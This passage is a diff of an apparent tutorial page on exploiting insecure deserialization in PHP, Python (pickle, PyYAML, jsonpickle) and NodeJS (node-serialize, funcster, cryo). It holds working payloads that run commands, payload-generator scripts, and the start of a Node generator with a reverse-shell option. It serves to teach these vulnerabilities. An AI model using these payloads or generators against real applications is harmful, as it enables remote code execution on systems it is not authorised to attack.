+Then, we can test the payload launching the vulnerable script, giving as input the payload, prefixed with the phar wrapper:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>php php-wrap-desert.php -fphar://desert.phar/desert -p
+</pre></div>
+
+<p>Doing that will spawn a calculator on the hosting machine.</p>
+<p>The other seriliazation vulnerability can be exploited in a similar way, the only things to notice is the following:</p>
+<p>Even though we have a Slim RCE, if we don&rsquo;t enable the print function above, it won&rsquo;t work. It may be obvious, but in case you are struggling to get why, take a look to the Gadget Chain Vector above. Slim uses <code>__toString</code> to trigger the POP chain, hence it won&rsquo;t be able to do that without a string operation. Let&rsquo;s try it out. Create a payload like the following:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>phpggc Slim/RCE1 <span class="s2">&quot;system&quot;</span> <span class="s2">&quot;cmd /c calc&quot;</span> -o desert.bin
+</pre></div>
+
+<p>Try to run it, via the following command:</p>
+<p><div class="codehilite"><pre><span class="nv">$ </span>php php-wrap-desert.php -fdesert.bin
+</pre></div>
+Nothing will happen. Now enable the print function and retry. A calculator will spawn on the hosting machine.</p>
 <h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link"></a></h3>
 <p>Python as well offers built-in support for serialization/deserialization, with many library that can easily marshal an objects using different archive-formats, as binary, XML, JSON, YAML, and so on.
 Within the years, a few module were found to be affected by unsafe deserialization issues
@@ -2348,28 +2678,8 @@ packages\jsonpickle\unpickler.py
 <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
 </pre></div>
 
-<p>Ok, that&rsquo;s seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? </p>
+<p>Ok, that&rsquo;s seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? So, last but not least, we&rsquo;ll explore a way to dynamically generate valid payloads for all the python modules we saw above.</p>
 <p><strong>Generating Exploits for pickle, PyYAML, and jsonpickle</strong></p>
-<p>To testing our payloads, and for simplicity, we&rsquo;ll use the following vulnerable code:</p>
-<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">_pickle</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">yaml</span>
-<span class="kn">import</span> <span class="nn">jsonpickle</span>
-
-<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;b&quot;</span><span class="p">:</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
-        <span class="n">_pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;y&quot;</span><span class="p">:</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
-        <span class="k">if</span> <span class="nb">float</span><span class="p">(</span><span class="n">yaml</span><span class="o">.</span><span class="n">__version__</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">5.1</span><span class="p">:</span> 
-            <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;j&quot;</span><span class="p">:</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
-        <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-</pre></div>
-
 <p>I created the following code, which can be used to generate different payloads for pickle, yaml and jsonpickle:</p>
 <div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">_pickle</span>
@@ -2404,7 +2714,7 @@ packages\jsonpickle\unpickler.py
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
     <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
-        <span class="n">description</span><span class="o">=</span><span class="s">&#39;pysoserial - A simple serialization payload generator&#39;</span><span class="p">,</span> <span class="n">add_help</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="n">description</span><span class="o">=</span><span class="s">&#39;PayloadGenerator - A simple serialization payload generator&#39;</span><span class="p">,</span> <span class="n">add_help</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
     <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
         <span class="s">&#39;-d&#39;</span><span class="p">,</span> <span class="s">&#39;--debug&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
@@ -2436,24 +2746,616 @@ packages\jsonpickle\unpickler.py
     <span class="n">cls</span> <span class="o">=</span> <span class="n">Payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">vector</span><span class="p">)</span>
 
     <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;pickle&quot;</span><span class="p">:</span>
-
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
-            <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">save</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+                <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Final Payload:</span><span class="se">\n</span><span class="s">    {_pickle.dumps(cls)}&quot;</span><span class="p">)</span>
     <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;json&quot;</span><span class="p">:</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
-            <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">save</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+                <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Final Payload:</span><span class="se">\n</span><span class="s">    {jsonpickle.encode(cls)}&quot;</span><span class="p">)</span>
     <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;yaml&quot;</span><span class="p">:</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
-            <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">save</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+                <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">cls</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">    &#39;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Final Payload:</span><span class="se">\n</span><span class="s">    {p}&quot;</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 </pre></div>
 
-<p>Now that we explained the main ways to explained the main ways to exploit python </p>
+<p>The functions provided by this simple tool can be inpected using the help:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>python PayloadGenerator.py -h
+usage: PayloadGenerator.py <span class="o">[</span>-h<span class="o">]</span> <span class="o">[</span>-d<span class="o">]</span> <span class="o">[</span>-s<span class="o">]</span> <span class="o">[</span>-v <span class="o">{</span>os,subprocess<span class="o">}]</span> -f <span class="o">{</span>pickle,json,yaml,#<span class="o">}</span> <span class="o">[</span>-c COMMAND<span class="o">]</span>
+
+PayloadGenerator - A simple serialization payload generator
+
+optional arguments:
+  -h, --help            show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  -d, --debug           Enable debug messages
+  -s, --save            Save payload to file
+  -v <span class="o">{</span>os,subprocess<span class="o">}</span>, --vector <span class="o">{</span>os,subprocess<span class="o">}</span>
+                        Save payload to file
+  -f <span class="o">{</span>pickle,json,yaml,#<span class="o">}</span>, --format <span class="o">{</span>pickle,json,yaml,#<span class="o">}</span>
+                        Serialization archive format
+  -c COMMAND, --command COMMAND
+                        Command <span class="k">for</span> the payload
+</pre></div>
+
+<p>To test our payloads, and for simplicity, we&rsquo;ll use the following vulnerable code:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">_pickle</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">yaml</span>
+<span class="kn">import</span> <span class="nn">jsonpickle</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;b&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">_pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;y&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">float</span><span class="p">(</span><span class="n">yaml</span><span class="o">.</span><span class="n">__version__</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">5.1</span><span class="p">:</span> 
+            <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;j&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</pre></div>
+
+<p>To generate a valid payload for jsonpickle, for example, we can use the script with the following args:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>python PayloadGenerator.py -f json -v os -c <span class="s2">&quot;cmd /c calc&quot;</span>
+<span class="o">[</span>+<span class="o">]</span> Generating serialized object <span class="k">for</span>:
+    cmd /c calc
+<span class="o">[</span>+<span class="o">]</span> Final Payload:
+    <span class="o">{</span><span class="s2">&quot;py/reduce&quot;</span>: <span class="o">[{</span><span class="s2">&quot;py/function&quot;</span>: <span class="s2">&quot;nt.system&quot;</span><span class="o">}</span>, <span class="o">{</span><span class="s2">&quot;py/tuple&quot;</span>: <span class="o">[</span><span class="s2">&quot;cmd /c calc&quot;</span><span class="o">]}]}</span>
+</pre></div>
+
 <h4 id="references_1">References<a class="headerlink" href="#references_1" title="Permanent link"></a></h4>
 <ul>
 <li><a href="https://www.exploit-db.com/docs/47655">PyYAML - Exploit-DB</a></li>
 <li><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">Exploiting jsonpickle</a></li>
 </ul>
+<h3 id="nodejs">NodeJS<a class="headerlink" href="#nodejs" title="Permanent link"></a></h3>
+<p>In NodeJS, serialization is handled by many different modules, which allow to marshal arbitrary complex objects in JSON-like format. We&rsquo;ll se a few of them, which were found to be susceptible to deserialization issues:</p>
+<ul>
+<li>node-serialize</li>
+<li>serialize-to-js</li>
+<li>funcster</li>
+</ul>
+<p>Before starting digging into the vulnerabilities, it should be clear to the reader that this kind of issues in JavaScript behave way differently in compariso to previous examples. No POP gadget chain is required to trigger RCE or sort of. Why so? Well, usually, bug of this type in JavaScript implies the serialized payload to be passed to functions like <code>eval()</code>, or <code>new Function()</code>, which implies that arbitrary code may be executed by the application.</p>
+<p><strong>node-serialize</strong></p>
+<p>The first NodeJS module we&rsquo;ll analyse is <code>node-serialize</code>. In 2017, a researcher named <strong>Ajin Abraham</strong> found that this module allowed deserialization of function objects in a non-safe way, leading to RCE. </p>
+<p>If you test it, you&rsquo;ll find out that <code>node-serialize</code> serializes objects using regular JSON format. The question that may arise is, why not JSON.stringify(), then? The reason being that JSON cannot really serialize functions.</p>
+<p>For this reason, if an object containing a functional literal, is serialized with <code>JSON.stringify</code>, the literal would be lost:</p>
+<div class="codehilite"><pre><span class="nx">node</span> <span class="o">-</span><span class="nx">e</span> <span class="s2">&quot;console.log(JSON.stringify({&#39;a&#39;:function(){console.log(&#39;HELLO!&#39;);}}));&quot;</span>
+
+<span class="p">{}</span>
+</pre></div>
+
+<p>While if serialized with <code>node-serialize</code>, the result would be the following:</p>
+<div class="codehilite"><pre><span class="nx">$</span> <span class="nx">node</span> <span class="o">-</span><span class="nx">e</span> <span class="s2">&quot;console.log(require(&#39;node-serialize&#39;).serialize({&#39;a&#39;:function(){console.log(&#39;HELLO!&#39;);}}));&quot;</span>
+
+<span class="p">{</span><span class="s2">&quot;a&quot;</span><span class="o">:</span><span class="s2">&quot;_$$ND_FUNC$$_function(){console.log(&#39;HELLO!&#39;);}&quot;</span><span class="p">}</span>
+</pre></div>
+
+<p>The problem arises, of course, during the deserializaation process, because to reverse the function back, <code>node-serialize</code> would pass any object prefixed with <code>_$$ND_FUNC$$_</code> to <code>eval</code>, as can be seen from the following snippet:</p>
+<div class="codehilite"><pre><span class="c1">// https://github.com/luin/serialize/blob/master/lib/serialize.js</span>
+<span class="mi">75</span><span class="p">.</span> <span class="k">if</span><span class="p">(</span><span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">FUNCFLAG</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">76</span><span class="p">.</span>     <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">].</span><span class="nx">substring</span><span class="p">(</span><span class="nx">FUNCFLAG</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span><span class="p">);</span>
+<span class="mi">77</span><span class="p">.</span> <span class="p">}</span>
+</pre></div>
+
+<p>So if we serialize an object like this:</p>
+<div class="codehilite"><pre><span class="p">{</span><span class="s2">&quot;rce&quot;</span><span class="o">:</span><span class="s2">&quot;_$$ND_FUNC$$_function() { CMD = \&quot;cmd /c calc\&quot;; require(&#39;child_process&#39;).exec(CMD, function(error, stdout, stderr) { console.log(stdout) }); }()&quot;</span><span class="p">}</span>
+</pre></div>
+
+<p>We would achieve remote code execution on the target machine (in this case, spawn a calculator on a Windows box).</p>
+<p><strong>funcster</strong></p>
+<p>The <code>funcster</code> module is also affected by a deserialization vulnerability. However, this time, the vulnerability is triggered via <code>module.exports</code> and executed whithin a sandboxed environment:</p>
+<div class="codehilite"><pre><span class="c1">// https://github.com/jeffomatic/funcster/blob/master/js/lib/funcster.js</span>
+<span class="mi">83</span><span class="p">.</span> <span class="nx">_generateModuleScript</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">serializedFunctions</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">84</span><span class="p">.</span>      <span class="kd">var</span> <span class="nx">body</span><span class="p">,</span> <span class="nx">entries</span><span class="p">,</span> <span class="nx">name</span><span class="p">;</span>
+<span class="mi">85</span><span class="p">.</span>      <span class="nx">entries</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="mi">86</span><span class="p">.</span>      <span class="k">for</span> <span class="p">(</span><span class="nx">name</span> <span class="k">in</span> <span class="nx">serializedFunctions</span><span class="p">)</span> <span class="p">{</span>
+<span class="mi">87</span><span class="p">.</span>        <span class="nx">body</span> <span class="o">=</span> <span class="nx">serializedFunctions</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
+<span class="mi">88</span><span class="p">.</span>        <span class="nx">entries</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&quot;&quot;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;: &quot;</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+<span class="mi">89</span><span class="p">.</span>      <span class="p">}</span>
+<span class="mi">90</span><span class="p">.</span>      <span class="nx">entries</span> <span class="o">=</span> <span class="nx">entries</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">);</span>
+<span class="mi">91</span><span class="p">.</span>      <span class="k">return</span> <span class="s2">&quot;module.exports=(function(module,exports){return{&quot;</span> <span class="o">+</span> <span class="nx">entries</span> <span class="o">+</span> <span class="s2">&quot;};})();&quot;</span><span class="p">;</span>
+<span class="mi">92</span><span class="p">.</span>    <span class="p">},</span>
+<span class="p">...</span>
+<span class="mi">141</span><span class="p">.</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createScript</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">filename</span><span class="p">).</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+<span class="mi">142</span><span class="p">.</span> <span class="k">return</span> <span class="nx">sandbox</span><span class="p">.</span><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="p">;</span>
+</pre></div>
+
+<p>For this reason, we cannot directly call function as <code>require()</code>. However, we can still exploit it via sandbox bypassing. The common technique to achieve that is to access global objects via <code>this.constructor.costructor</code>. This payload can be used to achieve RCE on an application using <code>require('funcster').unserialize()</code>:</p>
+<div class="codehilite"><pre><span class="p">{</span><span class="s2">&quot;rce&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;__js_function&quot;</span><span class="o">:</span><span class="s2">&quot;function(){CMD=\&quot;cmd /c calc\&quot;;const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()&quot;</span><span class="p">}}</span>
+</pre></div>
+
+<p><strong>cryo</strong></p>
+<p>The last module we&rsquo;ll see is <code>cryo</code>. This library, as explicitly stated on the module website, extends the JSON functionalities offering complex object and function serialization.</p>
+<p>This library is not directly vulnerable to RCE via deserialization, because it properly handles function and complex objects. However, it allows for object prototypes redefinition. As you may know, any object in JavaScript holds is own properties and methods. Usually, it&rsquo;s not possible to add properties to an existing object constructor, however, JavaScript prototype allows to add/redefine properties or methods at runtime, without adding them via the default constructor. Additionally, we can access the <code>Object.prototype</code> property using the <code>__proto__</code> property.</p>
+<p>The <code>__proto__</code> property of Object.prototype is an accessor property (a getter function and a setter function) that exposes the internal <a class="wikilink" href="/Prototype/">Prototype</a> (either an object or null) of the object through which it is accessed.</p>
+<p>If we manipulate the <code>__proto__</code> property, then, we could be able to overwrite/redefine standard methods of the object we want to deserialize, such as <code>toString()</code> or <code>valueOf()</code>. So what would happen if we try to deserialize the following JSON payload?</p>
+<div class="codehilite"><pre><span class="p">{</span>
+    <span class="s2">&quot;root&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_REF_2&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;references&quot;</span><span class="o">:</span><span class="p">[{</span>
+        <span class="s2">&quot;contents&quot;</span><span class="o">:</span><span class="p">{},</span>
+        <span class="s2">&quot;value&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_FUNCTION_function(){ CMD = \&quot;cmd /c calc\&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).exec(CMD, function(error, stdout, stderr) { console.log(stdout) });}()&quot;</span>
+    <span class="p">},</span>
+    <span class="p">{</span>
+        <span class="s2">&quot;contents&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;toString&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_REF_0&quot;</span><span class="p">},</span>
+        <span class="s2">&quot;value&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_OBJECT_&quot;</span> <span class="p">},</span>
+    <span class="p">{</span>
+        <span class="s2">&quot;contents&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;__proto__&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_REF_1&quot;</span><span class="p">},</span>
+        <span class="s2">&quot;value&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_OBJECT_&quot;</span>        
+    <span class="p">}]</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>During deserialization, cryo would redefine the <code>toString()</code> function, via <code>__proto__</code> accessor. If later on the application try calling the <code>toString()</code> method of the deserialized object, the RCE function would be called instead.
+Of course, we can redefine whatever object method we like, <code>toString</code> is just an example.</p>
+<h4 id="generate-payloads-dynamically">Generate payloads dynamically<a class="headerlink" href="#generate-payloads-dynamically" title="Permanent link"></a></h4>
+<p>As we&rsquo;ve seen how the process works, it&rsquo;s time to create our payloads. The following script can be used to generate different payloads for the libraries we&rsquo;ve just seen. This tool is just a PoC, as such is not very powerful, but it&rsquo;s a starting point.</p>
+<div class="codehilite"><pre><span class="cm">/**</span>
+<span class="cm">* This script provides a simple cli to generate payloads for:</span>
+<span class="cm">* - node-serialize</span>
+<span class="cm">* - funcster</span>
+<span class="cm">* - cryo</span>
+<span class="cm">*</span>
+<span class="cm">* It&#39;s not meant to be a complete tool, but just a proof of concept</span>
+<span class="cm">**/</span>
+<span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">argv</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;yargs&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">usage</span><span class="p">(</span><span class="s1">&#39;Usage: $0 -f [file] [options]&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="p">,</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;serializer&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="s1">&#39;vector&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;command&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;H&#39;</span><span class="p">,</span> <span class="s1">&#39;lhost&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;P&#39;</span><span class="p">,</span> <span class="s1">&#39;lport&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;target&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;cryoprototype&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;help&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="p">[,</span> <span class="s1">&#39;ns&#39;</span><span class="p">,</span> <span class="s1">&#39;fstr&#39;</span><span class="p">,</span> <span class="s1">&#39;cryo&#39;</span><span class="p">])</span>
+    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;serialize&#39;</span><span class="p">,</span> <span class="s1">&#39;deserialize&#39;</span><span class="p">])</span>
+    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;rce&#39;</span><span class="p">,</span> <span class="s1">&#39;rshell&#39;</span><span class="p">])</span>
+    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="s1">&#39;windows&#39;</span><span class="p">])</span>
+    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;windows&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;toString&#39;</span><span class="p">)</span>
